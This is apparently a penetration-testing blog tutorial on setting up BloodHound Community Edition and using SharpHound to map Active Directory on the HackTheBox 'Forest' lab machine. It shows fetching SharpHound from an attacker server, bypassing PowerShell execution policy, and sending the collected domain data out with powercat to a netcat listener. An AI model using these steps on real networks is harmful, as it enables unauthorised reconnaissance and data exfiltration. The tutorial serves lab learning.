
---
title: "How to Setup BloodHound Community Edition"
summary: "Quick explanation on how to get BloodHound up and running in a few minutes! This post include a step by step installation guide of **BloodHound**, as well as downloading **SharpHound** and uploading it to a machine in order to map out an Active Directory Network."
categories: ["Post","Blog",]
tags: ["tools"]
#externalUrl: ""
#showSummary: true
draft: false
date: 2025-01-11

---

## BloodHound 
**BloodHound** is a powerful and widely used tool in the field of cybersecurity, particularly for penetration testers in _Corporative Enviroments_. It is designed to map and analyze Active Directory structures, helping identify security misconfigurations and potential attack paths that an adversary could exploit to escalate privileges or gain access to sensitive resources.

**BloodHound** operates by collecting and visualizing relationships within an AD domain. These relations include group memberships, user permissions, trust relationships, and more. The tool’s strength lies in its ability to uncover complex chains of privileges that might be invisible to administrators manually auditing AD security.

We will do a quick installation step by step of the Community Version of **BloodHound**, as well and a small step by step tutorial on how to run both **BloodHound** and **SharpHound** taking as an example the [Forest](https://s3ntinl.github.io/posts/forest/) Machine from HackTheBox. Check out my post of the machine if you haven't already!

Let's begin!

- - -
## Installation
First, we need to install _Docker_:

```bash
kali@kali:~$ sudo apt install -y docker.io

kali@kali:~$ sudo systemctl enable docker --now
```

Then, create the _docker_ group if it does not exist:

```bash
kali@kali:~$ sudo groupadd docker
```

Add your user to the _docker_ group:

```bash
kali@kali:~$ sudo usermod -aG docker $USER
```

Now, install **docker-compose** form [github](https://github.com/docker/compose/). Also, remember to give execution rights to the binary and add it to the `/usr/bin` directory.

>[!Note]
>Keep in mind your architecture of Linux when downloading Docker-Compose. I use ARM Version of Kali Linux but you may use other version.

```bash
kali@kali:~$ mv ./docker-compose-linux-aarch64 docker-compose
kali@kali:~$ chmod +x ./docker-compose
kali@kali:~$ mv ./docker-compose /usr/bin/
```

Lastly, we need to copy the **BloodHound** `docker-compose.yml` file to save it locally:

```bash
kali@kali:~$ sudo wget https://ghst.ly/getbhce -O docker-compose.yml
kali@kali:~$ docker-compose up
```

**BloodHound** will be available on port 8080.

- - -
## SharpHound
**SharpHound** is the data collection component of BloodHound. It is a C# tool designed to gather information from Active Directory environments, which is then used by BloodHound to map and analyze attack paths. SharpHound collects data such as user sessions, group memberships, ACLs, and trust relationships, giving penetration testers and security analysts a detailed view of the environment.

The collected data is stored in JSON files, which are later imported into BloodHound for visualization and analysis. Together, SharpHound and BloodHound are a powerful duo for identifying and understanding security weaknesses in AD domains.

- - -
## BloodHound  and SharpHound Usage

First, let's log into **BloodHound**. We have it already running, so we need to access it on `http://localhost:8080`.

![bloodhound1](/img/bloodhound/bloodhound1.png)

> The first time we access **BloodHound**, we will need to input the random generated password found on the terminal window where `docker-compose` is running. Then, we will need to change it. The default user is **admin**.

![bloodhound9](/img/bloodhound/bloodhound9.png)

Now on the _Download Collectors_ tab, we can download the latest version of **SharpHound**:

![bloodhound3](/img/bloodhound/bloodhound3.png)

Here, select **SharpHound**, and we’re almost ready to start collecting data! Just a few more steps:

![bloodhound4](/img/bloodhound/bloodhound4.png)

Next, upload the **SharpHound** executable to the Windows machine whose Active Directory you intend to map. From our Attacker Machine, we serve **SharpHound** from a _Python_ Server:

```bash
┌──(s3n㉿kali)-[/opt/bloodhound/sharphound]
└─$ python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

From the Windows Machine, we download **SharpHound** with the following command:

```powershell
PS C:\Users\svc-alfresco\Desktop> iwr -uri http://10.10.14.18/SharpHound.ps1 -Outfile SharpHound.ps1
```

After transfer it to the Windows Machine, we can import it to PowerShell:

```powershell
PS C:\Users\svc-alfresco\Desktop> powershell -ep bypass

PS C:\Users\svc-alfresco\Desktop> Import-Module .\Sharphound.ps1
```

Now, we can run the script to collect all the information from the domain. **SharpHound** primarily relies on `LDAP` queries to gather data from Active Directory. Since LDAP queries are a standard part of domain communication, any domain-authenticated user can execute them, which is why SharpHound doesn’t require administrative privileges for most of its operations.

```powershell
PS C:\Users\svc-alfresco\Desktop> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\svc-alfresco\Desktop\ -OutputPrefix "forest"
```

After executing, we'll see a **zip** file with all the information. That's what we need to transfer back to our attacking machine. The .bin file that **BloodHound** generates is a binary file used as a cache for preprocessed data. When you import JSON files collected by SharpHound into BloodHound, it processes the data and stores it in a Neo4j database. 

The `.bin` file serves as a local cache of this processed data to improve performance, but we don't necesarilly need to transfer it back to our machine, so we will ignore it.

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/10/2025   9:29 AM          43554 forest_20250110092905_BloodHound.zip
-a----        1/10/2025   9:15 AM        1942029 SharpHound.ps1

```

We can use our favorite transfer method, I will use `powercat.exe`:

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> powercat -c 10.10.14.18 -p 4444 -i C:\Users\svc-alfresco\Desktop\forest_20250110092905_BloodHound.zip
```

On our Attacking Machine, we need to open a `netcat` listener in order to receive the data:

```bash
┌──(s3n㉿kali)-[/opt/bloodhound]
└─$ sudo nc -nlvp 4444 > bloodhound.zip   
listening on [any] 4444 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.161] 50906
```

Once we have the zip file locally on our machine, let's upload it to **BloodHound**. First, press the _Administration_ option.
![bloodhound2](/img/bloodhound/bloodhound2.png)

Import the zip file in the _File Ingest_ option, in the _Data Collection_ section:

![bloodhound10](/img/bloodhound/bloodhound10.png)

Click and Select the _zip_ file

![bloodhound5](/img/bloodhound/bloodhound5.png)

Nice! It was succesfully uploaded.

![bloodhound6](/img/bloodhound/bloodhound6.png)

Teaching how to do queries with **BloodHound** it out of the scope of this post, but let's run a quick "_Shortest Paths to Domain Admins_" query to check if the ingestion of the data was successful.
![bloodhound7](/img/bloodhound/bloodhound7.png)

It works! You now have a fully functional **BloodHound** instance up and running, ready to map out and analyze your Active Directory environment. 

## Stopping the Instance

Stopping the instance is as easy as pressing `Ctrl+C` on the terminal window where `docker-compose` is running.

![bloodhound8](/img/bloodhound/bloodhound8.png)

If you want to set it up again, just do `docker-compose up` and you are good to go.

I hope this guide was helpful in getting everything set up smoothly, as setting up a **BloodHound** environment could be tricky at first. Give it a try! 